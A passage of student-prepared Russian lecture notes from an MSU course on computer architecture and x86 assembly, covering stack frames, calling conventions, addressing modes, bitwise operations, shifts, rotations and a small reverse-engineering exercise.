формирует – выделяет некоторое дополнительное место на стеке, с которым можно
работать. Когда мы выходим, отрабатывает эпилог – некоторое количество функции,
которое переставит указатель стека наверх и вернет указатель стека на то место, где
находится адрес возврата и выполнит команду ret.
   Итак,

   • Во фрейме размещаются

            – – Локальные переменные
            – Данные, необходимые для возврата из
              функции
            – Временные переменные

   • Управление фреймами
                                                      Рис. 5.8: Иллюстрация                     к
            – Пространство выделятся во время входа в объяснению
              функцию

                      * «пролог» функции
            – Освобождается на выходе

                      * «эпилог» функции
    Таким образом, применительно к той последовательности вызовов, которые мы
разбирали выше, последовательность фреймов на стеке будет формироваться следующим
образом (рис. 5.9). Каждый фрейм оказывается зажатым между двумя указателями. esp
указывает на нижнюю границу, а верхняя граница фрейма адресуется регистром ebp. Его
использование –м вопрос соглашения (с ним не связаны никаких специализированные
команды). Таким образом, отработала первая функция.
    Вызывается вторая функция (рис. 5.10). В этот момент на стеке выделяется еще одна
область (за счет того, что отрабатывает код пролога). Далее происходит третий вызов.
Снова создается фрейм (рис. 5.11).
    Далее происходит рекурсивный вызов (рис. 5.12). Таким образом, в данный момент
времени существует два разных независимых фрейма, относящихся к одной и той же
функции. Таких фреймов может быть несколько (рис. 5.13). Мы можем использовать
столько места, сколько операционная система выделила нам под стек. Обычно эта область
памяти не очень большая, так как она может переиспользоваться и внутри каждого фрейма
не принято выделять много памяти. Для этого у нас есть динамическая память, в которую
можно отправлять большие объёмы.


                                           63
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 5.9: Последовательность фреймов




        Рис. 5.10: Вызов функции                              Рис. 5.11: Вызов функции



    В случае выхода один фрейм исчезает (рис. 5.14), ebp и esp переставляются выше.
Потом заканчивается еще один рекурсивный вызов за счет того, что эпилог переставил
все наверх (рис. 5.15).
    Возвращаемся в функцию who (рис. 5.16). Спускаемся вниз по операторам до
следующего вызова и на том же самом месте в памяти возник еще один фрейм,
относящийся к другому вызову с другого места (рис. 5.17).
    Отрабатываем этот вызов (рис. 5.18 и рис. 5.19).


Организация фрейма в IA-32/Linux
   • Текущий фрейм (от “верхушки” ко «дну»)

            – “Пространство параметров”: фактические параметры
              вызываемых функций
            – Локальные переменные
            – Сохраненные регистры
            – Прежнее значение указателя фрейма

   • Фрейм вызывающей функции                                                 Рис.                  5.20:
                                                                              Организация
            – Адрес возврата                                                  фрейма


                                                  64
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     Рис. 5.12: Рекурсивный вызов                      Рис. 5.13: Продолжение рекурсивного
                                                       вызова




                                                       Рис. 5.15: Выход из рекурсивного
     Рис. 5.14: Выход из функции                       вызова



                      * Помещается на стек инструкцией call
            – Значения фактических аргументов для текущего вызова

    Рассмотрим организацию фрейма подробнее. Есть 8 регистров общего назначения
(РОН). Из них ESP, EBP выполняют некую служебную роль. Остальные шесть: EAX,
ECX, EDX, EBX, ESI, EDI. В тот момент, когда вызывают некоторую функцию, по
соглашению она считает, что тремя регистрами можно начать пользоваться сразу.
Если функция разрушит их и перезапишет, ничего страшного не произойдет (это
регистры EAX, ECX, EDX). Оставшиеся три регистра нужно предварительно сохранять.
Соответственно, если есть некоторые величины, которые должны сохраниться, даже если
в дальнейшем что-то будет вызываться, эти величины нужно сохранить на указанных
трех регистрах. Если же есть какие-то текущие величины, которые потом можно стереть,
то их следует помещать на первых трех регистрах.

   Пример. Рассмотрим следующий код:
int main () {
    int a = 1, b = 2, c;


                                                  65
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Рис.   5.16:                      Иллюстрация   к            Рис.   5.17:         Иллюстрация             к
объяснению                                                   объяснению




Рис. 5.18: Иллюстрация к объяснению                       Рис. 5.19: Иллюстрация к объяснению



     c = sum (a, b);
     return 0;
}

int sum (int x, int y) {
    int t = x + y;
    return t;
}
Отображение:
include 'io.inc '
section . text
global CMAIN
CMAIN :
...
    mov dword [ebp -16] , 0x1 ;                     (1)
    mov dword [ebp -12] , 0x2 ;                     (2)
    mov eax , dword [ebp -12] ;                     (3)
    mov dword [ esp +4] , eax ;                     (4)
    mov eax , dword [ebp -16] ;                     (5)
    mov dword [ esp ], eax    ;                     (6)


                                                    66
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            call sum                               ; (7)
            mov dword [ebp -8] , eax               ; (8)
...
global sum
sum :
      push ebp                                     ;   (9)
      mov ebp , esp                                ;   (10)
      sub esp , 0 x10                              ;   (11)
      mov edx , dword [ ebp +12]                   ;   (12)
      mov eax , dword [ ebp +8]                    ;   (13)
      add eax , edx                                ;   (14)
      mov dword [ebp -4] , eax                     ;   (15)
      mov eax , dword [ebp -4]                     ;   (16)
      mov esp , ebp                                ;   (17)
      pop ebp                                      ;   (18)
      ret                                          ;   (19)

                                                                                                          ebp'

                                                           ebp'                                 -4
ebp                   ebp'                                                                      -8
                                              -4
      -4                                                                                        -12       b:2
                                              -8
      -8                                                                                        -16       a:1
                                              -12          b:2
      -12              b:2                                 a:1
                                              -16
      -16              a:1                                                                      +12         2
                                                                                                +8          1
                                                             2
                         2                                                                      +4    адрес возврата
                                        esp                  1
esp                      1                                                                ebp            ebp"
                                                       адрес возврата
              адрес возврата                                                                    -4         t:3
                                        ebp                ebp"



Рис.        5.21:                                                                         esp
                                        Рис.        5.22:
Иллюстрация                                                                               Рис.        5.23:
                                        Иллюстрация
к примеру                                                                                 Иллюстрация
                                        к примеру
                                                                                          к примеру


   Функция main начинается с того места, где идет инициализация локальных
переменных. В тот момент, когда выполняется функция, есть регистр ebp, который
указывает на значение ebp для верхнего фрейма (обозначим ebp’). Далее вниз идут
смещения (рис. 5.21). Во второй ((2))строке начинается вызов функции. Помещаем в
стек аргументы (рис. 5.21). На седьмой строке вызывается функция sum. В этот момент
осуществляется передача управления на метку, которая использовалась для обозначения
начала тела функции и запоминается адрес возврата. Команда ret на девятнадцатой
строке вернет нас на восьмую строку. Внутри функции sum начинает работать пролог
функции. После того, как сработал call, esp переместился на адрес возврата. Команды
push ebp и mov ebp, esp переставляют указатель верхней границы фрейма на новое место


                                                        67
            ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
            МАТЕМАТИКИ И КИБЕРНЕТИКИ
            МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




согласно принятым соглашениям. Сразу под адресом возврата появляется значение
ebp”. При этом, согласно десятой строке, ebp переставляется туда, на что указывает esp
(рис. 5.22). В одиннадцатой строке выделяется автоматическая память (команда sub).
Соответственно, в стеке появляется ещё четыре ячейки. Теперь esp должна указывать
на последнюю ячейку (рис. 5.23). Далее пролог заканчивается пролог, возникает фрейм.
Начинается чтение параметров. Они адресуются относительно ebp, который указывает
на верхнюю границу (рис. 5.23). Команды (12)-(13): переносим 2 и 1 в edx и eax. Команда
(14): складываем эти два регистра, сумма в eax. В строке (15) записываем значение в
переменную t, которая лежит по смещению -4 (рис. 5.23).
    В строке (16) переходим к оператору return. Возвращаемое значение помещаем в
eax и переходим в эпилог функции. В эпилоге мы восстанавливаем указатель границы
фрейма. Для этого возвращаем esp на прежнее место (рис. 5.24). После выполнения pop
ebp значение ячейки восстановится, в нее попадет значение, которое было записано в
ebp которое указывает на ebp’. Таким образом, в команде (18) мы возвращаем ebp на
прежнее место (рис. 5.24). Команда (19) вызывает ret, после чего esp переходит на адрес
возврата (рис. 5.25). ret возвращает нас на восьмую строку, в eax находится возвращенное
значение. Соответственно, мы можем переслать это значение в переменную с (рис. 5.25).

 ebp                           ebp'                                 ebp             ebp'
       -4                                                                 -4
       -8                                                                 -8         c:3
       -12                      b:2                                       -12       b:2
       -16                      a:1                                       -16       a:1


       +12                          2                                     +12         2
       +8                           1                                     +8          1
       +4          адрес возврата                             esp         +4    адрес возврата
esp                          ebp"                                                  ebp"
       -4                                                                 -4         t:3
                                    t:3




                                                              Рис. 5.25: Иллюстрация к
Рис. 5.24: Иллюстрация к
                                                              примеру
примеру




                                          68
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 6. Система команд.
Группы команд
   Набор команд архитектуры можно условно разделить на две группы –
пользовательские и системные команды. Пользовательские команды используют
для того, чтобы реализовать нужный функционал того или иного прикладного алгоритма,
связанного с обработкой данных, с работой с информацией и пр. Системные команды
позволяют управлять ходом выполнения пользовательских команд (настраивать работу
с памятью, изолировать работающих программ друг от друга и др.). Система команд
избыточна, нужный функционал можно реализовать не задействуя все то, чем располагает
компилятор. Для разных процессоров набор команд, предлагаемый процессорной
архитектурой, может несколько отличаться. Ниже зеленым указаны те группы команд,
которые будут изучаться в курсе.

   • Общего назначения

   • e87 FPU

   • MMX

   • SSE

   • IA-32e команды 64-разрядного режима работы

   • Системные команды

   • Аппаратная виртуализация

   • ...

   Где команды общего назначения можно разделить на

   • Пересылка данных

   • Команды двоичной арифметики

   • Команды двоичнодесятичной арифметики

   • Логические команды

   • Сдвиги и вращения

   • Битовые и байтовые команды

   • Передача управления



                                        69
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Строковые

   • Ввод/Вывод

   • Явное управление EFLAGS

   • Вспомогательные
   При этом основные команды IA-32 можно разделить на следующие группы
(рис. 6.1). Красным выделены не упоминавшиеся ранее на лекциях ассемблерные
инструкции. Команды двоичной арифметики и логические команды представлены в
полном составе.




                                  Рис. 6.1: Группы команд



Команда LEA
    Команда LEA позволяет задействовать все возможности по вычислению
исполнительных адресов, которые присутствуют в процессоре и реализуются на
этапе увеличения значения операндов. Адресный код, находящийся внутри квадратных
скобок (см. рис. 6.2) способен закодировать достаточно сложное выражение. Запишем
его в общем виде. Получим следующую конструкцию: есть базовый регистр, в качестве
которого может выступать один из представленных на рис. 6.2 регистров, к нему
прибавляется еще один регистр (возможен повтор). К этому индексному регистру можно
приложить некоторый масштаб. В конце – смещение.
    В документации команда LEA описывается несколько иначе. Ее допустимый формат:

                                       𝐿𝐸 𝐴 𝑅32, 𝑚

Результат попадает в первый операнд – 32-разрядный регистр. Второй операнд – память
без спецификатора размера.


                                            70
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 6.2: Иллюстрация к объяснению



                                       ОП1 ←− АДРЕС (ОП2)

   В частности, описанное выше позволяет реализовывать посредством данной команды
ту же арифметику, которую можно создавать с поморью команд add, sub и проч. Это
делается за счёт того, что в дополнительном коде положительное смещение можно
превратить в отрицательное число и после того, как все вычисления будут выполнены,
результат будет обрезан по границам 32-разрядной сетки и никакие флаги не будут
при этом обновляться. Видно, что при этом можно провести умножение на некоторые
предопределенные константы, комбинируя регистры. Например, можно осуществить:

                                    𝐿𝐸 𝐴 𝐸 𝐴𝑋, [𝐸 𝐴𝑋 + 8 ∗ 𝐸 𝐴𝑋]

   что эквивалентно умножению на число 9.

   Отметим, что указанные выше действия выполняются в рамках одного из этапов
выполнения команды, поэтому всё происходит очень быстро. По этой причине если
у компилятора есть возможность, он использует команду LEA – использует все
возможности косвенной адресации. Косвенность адресации связана с тем, что в
вычислениях используется значения определенных регистров.


Косвенная адресация
   Рассмотрим некоторые специализированные названия косвенной адресации. Первый
вариант – относительная адресация. Её выражение:

                                           база + смещение

   Типичный пример: [ebp-16]. ebp – базовый регистр, который показывает верхнюю


                                                 71
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




границу текущего фрейма функции. Вычитаем из него 16 – получаем место внутри
фрейма. В зависимости от того, как мы распределили содержимое фрейма, мы можем,
например, обращаться к какой-то автоматической локальной переменной или области,
которая используется для промежуточных результатов вычисления.

   Базово-индексная. В составе адресного кода есть регистр база. К нему прибавляется
значение регистра индекса:
                                  база + индекс

   Пример: [EAX+ECX]. При этом нельзя сразу сказать, где в указанной конструкции сразу
указать, где база, а где – индекс. Для этого нужно располагать некоторым контекстом того,
какой код мы пишем.
   Если массив не однобайтный, нужно использовать коэффициент. Поэтому в
этом случае используем несколько другой тип адресации. Базово-индексная с
масштабированием:
                                    база + масштаб*индекс

   Пример: [eax+4*ecx].

   Рассмотрим соотношение типов для языка Си и ассемблера (таблица 1). Машина
поддерживает основные целые типы данных.

                                          Си               АСМ
                                          char             byte *1
                                          short            word *2
                                          int              dword *4
                                          long             dword *4
                                          long long        qword *8

                                     Таблица 1: Соотношение типов

   Последняя форма – Базово-индексная с масштабом и смещением. Выражение:

                                  База + Масштаб * Индекс + Смещение

Пример: [eax+4*ecx+10].



Реализация стрелки Пирса
   Пример. Реализация стрелки Пирса.
Известно, что число логических поразрядных операций не очень много. Машина дает нам
некоторые простой базис. Машина умеет порязрядно выполнять некоторый действия (см.


                                                      72
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




таблицу table:2). В указанной таблице левый столбец – обозначение операции в языке Си,
правый столбец – код мнемоники в машине. У всех трех команд одна и та же допустимая
                     8            8
           16         16
форма: r/m 32 , r/m/i 32 .

                                                 &   AND
                                                 |   OR
                                                 ∧   XOR

                                      Таблица 2: Стандартные операции

   Описать реализацию можно следующим образом:

                                          ОП1 ←− ОП1 ОП ОП2

   Где ОП – операция над операндом ОП2. Отметим, что SF и ZF обновятся (при
поразрядных действиях что-то будет в знаковом разряде, результат может быть как
нулевым, так и ненулевым). Переносов нет, поэтому флаги OF и CF можно занулить.
                                                                                     8
                                                                   16
   Рассмотрим четвертую команду – NOT (∼). У нее один операнд: r/m 32 . В этот операнд
производится запись поразрядной инвертации для каждого отдельного разряда:

                                               ОП ←− ∼ ОП

При этом флаги не меняются.
   Комбинируя рассмотренные четыре команды, можно реализовать любую булевую
функцию, выполняющуюся над отдельными разрядами.
   В качестве примера рассмотрим реализацию стрелки Пирса:
unsigned pierce_arrow ( unsigned a, unsigned b) {
    int t = ~(a | b);
    return t;
}
   Справедливо выражение:
                                              𝑎 ↓ 𝑏 = ň(𝑎 ∨ 𝑏)

   Это действие оформлено в коде как самостоятельная функция:
section . text
global pierce_arrow
pierce_arrow :
    push ebp
    mov ebp , esp
    mov eax , dword [ ebp +12] ; (1)
    or eax , dword [ ebp +8] ; (2)


                                                     73
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     not eax ; (3)
     pop ebp
     ret
Пролог и эпилог здесь не занумерованы. После выполнения двух первых команд регистр
ebp показывает на сохраненный ebp’. По смещению +8 от ebp (относительная косвенная
адресация) лежит параметр а, по смещению +12 – параметр b (рис. 6.3). В первой
команде мы перегружаем в eax. Далее перегружаем параметр b. Накапливая результат в
eax, выполняем OR и поразрядный NOT. Последние две команды – эпилог и выход из
функции.


                                            -12         b
                                            +8         a
                                                  адрес возврата
                                      ebp            ebp'

                                  Рис. 6.3: Иллюстрация к объяснению



Сдвиги
   Рассмотрим поразрядную пересылку одних разрядов в другие, то есть сдвиги.
У сдвигов есть две независимые характеристики – куда двигаем и то, как мы
интерпретируем то, что мы двигаем. Таким образом, имеем два параметра – направление
и данные (знаковые и беззнаковые), которые создают матрицу, в которой будут коды
операции (рис. 6.4). Первая буква для сдвигов – всегда буква S. Далее идет H – для
беззнаковых или A – для знаковых данных. Третья буква: L или R в зависимости от
направления.




                                             Рис. 6.4: Сдвиги

    В результате сдвигов влево неважно, как данные будут интерпретироваться, так как
то, что не умещается в старших разрядах, теряется безвозвратно, а то, что освобождается
справа, заполняется нулями (рис. 6.5). Интерпретация данных в данном случае будет
одинаковой, поэтому кодировки SHL и SAL по сути эквивалентны.
    В случае поразрядного сдвига вправо освободившиеся разряды будут заполняться
нулями, последний разряд будет оказываться в разряде CF (рис. 6.6).


                                                   74
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                          Рис. 6.5: Сдвиг влево




                                    Рис. 6.6: Логический сдвиг вправо


   В случае арифметического сдвига вправо старший разряд будет копироваться
(рис. 6.7). Таким образом, арифметический сдвиг вправо имеет сходство с делением.




                                  Рис. 6.7: Арифметический сдвиг вправо




                                                   75
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Форматы
   Для всех четырех команд первый операнд – регистр или память, второй операнд –
непосредственно закодированная величина:
                                        8
                                        16
                                  𝑟/𝑚        , 𝑖8 (𝑚𝑎𝑠𝑘𝑒𝑑 5 𝑏𝑖𝑡)
                                        32
Здесь masked 5 bit – маскированные пять разрядов. Это означает, что мы можем написать
в i8 какое-то число, причем старшие три разряда выкинут, а оставшиеся пять будут
интерпретировать как положительное число, на которое осуществляется сдвиг. Однако
далеко не всегда заранее известно, на сколько зарядов нужно подвинуть. В этом случае
первый операнд такой же, а второй операнд – регистр cl:
                                                  8
                                             𝑟/𝑚 16 , 𝑐𝑙
                                                 32
Флаги SF и ZF выставляются по результату.

   Рассмотрим следующий пример:
char upndown ( char x) {
    return (x << 8) >> 8;
}
Логический результат работы данной программы – ноль. Полученный код:
section . text
global upndown
upndown :
    push ebp
    mov ebp , esp
    movsx eax , byte [ ebp +8]
    sal eax , 8
    sar eax , 8
    pop ebp
    ret
   После того, как отработал пролог, первый параметр со смещения +8 интерпретируются
как знаковое число, командой movsx расширяем его до полного eax, а далее сдвигаем
число поочередно в обе стороны. Таким образом, если на вход поступило число 42, то и
результат будет – 42.




                                                 76
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Команды вращения
   Рассмотрим так называемые команды вращения. У них есть два параметра –
направление вращения битового вектора и участие флага CF (таблица 3). Допустимые
форматы вращения аналогичны форматам сдвигов. При этом то, что в последний раз
при вращении выходит за пределы разрядной сетки, копируется в разряд CF (рис. 6.8).
RCL и RCF предполагают явное участие флага CF (он добавляется как дополнительный,
32-разряд).

                                                      направление
                                                      лево право
                                     Участие   да     RCL RCR
                                      CF       нет    ROL ROR

                                    Таблица 3: Соотношение типов




                                  Рис. 6.8: Иллюстрация к объяснению

   В качестве примера Рассмотрим фрагмент кода криптографической хеш-функции:
unsigned sha256_f1 ( unsigned x) {
    unsigned t;
    t = (( x >> 2) | (x << (( sizeof (x) << 3) - 2)));    // (1)
    t ^= ((x >> 13) | (x << (( sizeof (x) << 3) - 13))); // (2)
    t ^= ((x >> 22) | (x << (( sizeof (x) << 3) - 22))); // (3)
    return t;
}
В криптографических хешах стараются разработать алгоритм хеширования таким
образом, чтобы коллизий было как можно меньше. В данном примере функция


                                                 77
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




sha256 вырабатывает так называемый дайджест длиной 256 разрядов. Эти разряды
интерпретируются как число. В пространство таких чисел, ограниченных такой
разрядной сеткой, много что отображается – коллизии будут всегда. Однако находтить
эти коллизии достаточно сложно, поэтому от функции требуется:
   • Необратимость: 𝐻 (𝑋) = 𝑚, m – задано

   • Стойкость к коллизиям первого рода: 𝐻 (𝑀) = 𝐻 (𝑁), M – задано

   • Стойкость к коллизиям второго рода: 𝐻 (𝑀1) = 𝐻 (𝑀2)
   Код, который построил компилятор:
global sha256_f1
sha256_f1 :
    push ebp
    mov ebp , esp
    mov edx , dword [ ebp +8]                   ;        (1)
    pop ebp                                     ;        (2)
    mov eax , edx                               ;        (3)
    mov ecx , edx                               ;        (4)
    ror eax , 13                                ;        (5)
    ror ecx , 2                                 ;        (6)
    xor eax , ecx                               ;        (7)
    ror edx , 22                                ;        (8)
    xor eax , edx                               ;        (9)
    ret
Сначала отрабатывается пролог, после чего в edx загружается значение unsigned x. Потом
edx копируется в ecx и eax. Таким образом, в трех регистрах находится одно и то же
значение x. Далее поддерево команд, изображенное на рис. 6.9, может быть сведено к
выполнению одной команды, что и происходит в строке (5).
                                                     |

                                            »                      «

                                       x        𝑐1             x       𝑐2

                                  Рис. 6.9: Иллюстрация к объяснению

    Во всех трех строчках Си-кода сдвиги влево и вправо скомбинированы так, чтобы
получить вращения. Происходит вращение eax и ecx. Далее (в (7) строке) осуществляется
xor с накоплением результата в eax. Далее – третье вращение, результат в edx. Потом вновь
применяем xor и получаем результирующее значение.


                                                         78
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Обратная задача
   Восстановим некоторую конструкцию, реализованную в ассемблерном коде. В
качестве подсказки имеем, что есть статические переменные:
static int a, b, c, d;

???
Ассемблерный код:
mov eax , dword [b]               ;   (1)
mov edx , dword [c]               ;   (2)
or al , -1                        ;   (3)
sal eax , 3                       ;   (4)
add edx , eax                     ;   (5)
mov dword [a], eax                ;   (6)
mov eax , edx                     ;   (7)
sar edx , 31                      ;   (8)
idiv dword [d]                    ;   (9)
mov dword [c], eax                ;   (10)
   Получаем, что 𝐸 𝐴𝑋 | 𝑏 , 𝐸 𝐷 𝑋 | 𝑐 . Далее от EAX используем только младший байт.
Такую ситуацию можно изобразить следующим образом: 𝐸 𝐴𝑋 | (𝑏|0𝑥𝐹𝐹) (к переменной
b применяется указанная константа). Далее происходит сдвиг вправо на три разряда:
𝐸 𝐴𝑋 | (𝑏|0𝑥𝐹𝐹)3 . Далее в EDX получаем сумму вида: 𝐸 𝐷 𝑋 | 𝑐+(𝑏|0𝑥𝐹𝐹)3 . Далее происходит
выгрузка EAX в переменную a: 𝑎 ←− 𝐸 𝐴𝑋. Далее, если считать, что значение переменной
а было зафиксировано, получим: 𝐸 𝐷 𝑋 | 𝑐+𝑎 . В (7) строке происходит копирование EDX
в EAX. В (9) строке происходит знаковое деление, соответственно, делимое нужно
подготовить, причём в данном случае подготовка к делению приходит с помощью
арифметического сдвига. Таким образом, в (7) и (8) строчке приходила подготовка к
делению. В (9) строке выполняется idiv, причем так как в (10) строке используется
EAX, после команды деления берется частное, а не остаток. Это частное выгружается в
переменную с. Запишем описанное выше в виде Си-кода:
a = (b|0 xFF ) < <3;
c=(c+a)/d;


Сложение 64-разрядных чисел на 32 разрядных регистрах
   Рассмотрим случай, когда для вычисления размера регистров не хватает. Рассмотрим
пример с командой ADC. Формат у нее такой же, как у сложения с одним отличием:

                                      ОП1 ←− ОП1+ОП2 + 𝐶𝐹


                                              79
